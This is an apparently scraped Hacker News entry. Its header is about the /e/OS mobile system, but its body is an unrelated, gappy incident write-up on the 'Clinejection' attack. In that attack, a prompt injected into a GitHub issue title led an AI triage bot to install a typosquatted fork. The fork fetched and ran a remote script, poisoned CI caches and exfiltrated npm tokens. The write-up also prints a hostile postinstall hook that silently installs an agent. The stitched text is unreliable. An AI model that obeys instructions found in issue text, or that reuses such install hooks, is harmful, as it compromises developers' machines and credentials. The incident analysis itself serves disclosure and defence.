---
title: /e/OS is a complete, fully “deGoogled” mobile ecosystem
source: hacker_news
url: https://e.foundation/e-os/
points: 637
---

Title: /e/OS is a complete, fully “deGoogled” mobile ecosystem
Points: 637, Author: doener, Comments: 398

Five steps from a GitHub issue title to 4,000 compromised developer machines. The entry point was natural language.
On February 17, 2026, someone published
to npm. The CLI binary was byte-identical to the previous version. The only change was one line in
"postinstall": "npm install -g openclaw@latest"
For the next eight hours, every developer who installed or updated Cline got OpenClaw - a separate AI agent with full system access - installed globally on their machine without consent. Approximately 4,000 downloads occurred before the package was pulled
The interesting part is not the payload. It is how the attacker got the npm token in the first place: by injecting a prompt into a GitHub issue title, which an AI triage bot read, interpreted as an instruction, and executed.
The attack - which Snyk named "Clinejection"
- composes five well-understood vulnerabilities into a single exploit that requires nothing more than opening a GitHub issue.
Step 1: Prompt injection via issue title.
Cline had deployed an AI-powered issue triage workflow using Anthropic's
. The workflow was configured with
, meaning any GitHub user could trigger it by opening an issue. The issue title was interpolated directly into Claude's prompt via
${{ github.event.issue.title }}
On January 28, an attacker created Issue #8904 with a title crafted to look like a performance report but containing an embedded instruction: install a package from a specific GitHub repository
Step 2: The AI bot executes arbitrary code.
Claude interpreted the injected instruction as legitimate and ran
pointing to the attacker's fork - a typosquatted repository (
, note the missing 'i' in 'github'). The fork's
contained a preinstall script that fetched and executed a remote shell script.
The shell script deployed Cacheract, a GitHub Actions cache poisoning tool. It flooded the cache with over 10GB of junk data, triggering GitHub's LRU eviction policy and evicting legitimate cache entries. The poisoned entries were crafted to match the cache key pattern used by Cline's nightly release workflow.
When the nightly release workflow ran and restored
from cache, it got the compromised version. The release workflow held the
(OpenVSX). All three were exfiltrated
Using the stolen npm token, the attacker published
with the OpenClaw postinstall hook. The compromised version was live for eight hours before StepSecurity's automated monitoring flagged it - approximately 14 minutes after publication
A botched rotation made it worse
Security researcher Adnan Khan had actually discovered the vulnerability chain in late December 2025 and reported it via a GitHub Security Advisory on January 1, 2026. He sent multiple follow-ups over five weeks. None received a response
When Khan publicly disclosed on February 9, Cline patched within 30 minutes by removing the AI triage workflows. They began credential rotation the next day.
But the rotation was incomplete. The team deleted the wrong token, leaving the exposed one active
. 
